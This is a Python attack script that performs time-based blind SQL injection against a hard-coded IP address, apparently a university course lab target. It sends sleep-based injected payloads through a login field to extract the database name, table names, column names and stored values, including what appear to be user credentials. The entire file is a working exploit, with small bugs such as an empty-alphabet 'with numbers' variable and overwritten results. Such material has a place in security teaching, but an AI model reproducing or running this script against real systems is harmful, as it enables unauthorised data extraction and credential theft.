#!/usr/bin/python3

import requests, time, sys, signal
from pwn import *

url = "http://84.88.58.170/UOC/Alumnos/blindsqlinjection/"
alphabet = r'abcdefghijklmnopqrstuvwxyz'
alphabet_with_numbers = r'abcdefghijklmnopqrstuvwxyz'

p2 = log.progress("Payload")
p1 = log.progress("Database")

def handler(sig, frame):
    log.failure("Saliendo")
    sys.exit(1)

signal.signal(signal.SIGINT, handler)

def check(payload):
    data_post = {
        'usuario': '%s' % payload
    }

    time_start = time.time()
    content = requests.post(url, data=data_post)
    time_end = time.time()

    duration = time_end - time_start
    if duration > 4:
        return True
    return False


def get_database():
    result = ""
    for i in range(0,10):
        for char in alphabet:
            payload = "' or if(substr(database(),%d,1)='%c', sleep(0.5),1) -- -" % (i, char)
            p2.status("%s" % payload)
            if check(payload):
                result += char
                p1.status("%s" % result)
                break
    p1.success("%s" % result)
    return result



def get_tables(database):
    tables = []
    for i in range(0, 3):
        result = ""
        p1 = log.progress("Tabla [%d]" % i)
        for j in range(1, 10):
            for char in alphabet:
                payload = "' or if(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1)='%c', sleep(0.5),1)-- -" % (database,i,j,char)

                p2.status("%s" % payload)
                if check(payload):
                    result += char
                    p1.status("%s" % result)
                    break
        p1.success("%s" % result)
        if result != "":
            tables.append(result)
    return tables


def get_columns(table):
    columns = []
    for i in range(0, 5):
        result = ""
        p1 = log.progress("Columna [%d]" % i)
        for j in range(1, 10):
            for char in alphabet:
                payload = "' or if(substr((select column_name from information_schema.columns where table_name='%s' limit %d,1),%d,1)='%c', sleep(0.5),1)-- -" % (table,i,j,char)

                p2.status("%s" % payload)
                if check(payload):
                    result += char
                    p1.status("%s" % result)
                    break
        p1.success("%s" % result)
        if result != "":
            columns.append(result)
    return columns



def get_values(columns, table):
    values = []
    for column in columns:
        for i in range(1,10):
            result = ""
            p1 = log.progress("[%s] Value" % column)
            for j in range(1, 15):
                for char in alphabet:
                    payload = "' or if(substr((select %s from %s limit %d,1),%d,1)='%c',sleep(0.5),1)-- -" % (column,table,i, j,char)

                    p2.status("%s" % payload)
                    if check(payload):
                        result += char
                        p1.status("%s" % result)
                        break
            p1.success("%s" % result)
            if result != "":
                values.append([table, column, result])
    return values



def main():
    database = get_database()
    log.info("Database: %s" % database)

    tables = get_tables(database)
    log.info("Tables: %s" % tables)

    # tables = ["usuarios"]
    columns = get_columns(tables[0])
    log.info("Columnas: %s" % columns)

    # columns = ["usuario", "host", "clave"]
    # table = "usuarios"
    values = []
    for table in tables:
        values = get_values(columns, table)

    log.info("Database: %s" % database)
    log.info("Tables: %s" % tables)
    log.info("Columnas: %s" % columns)
    log.info("Values: %s" % values)

main()
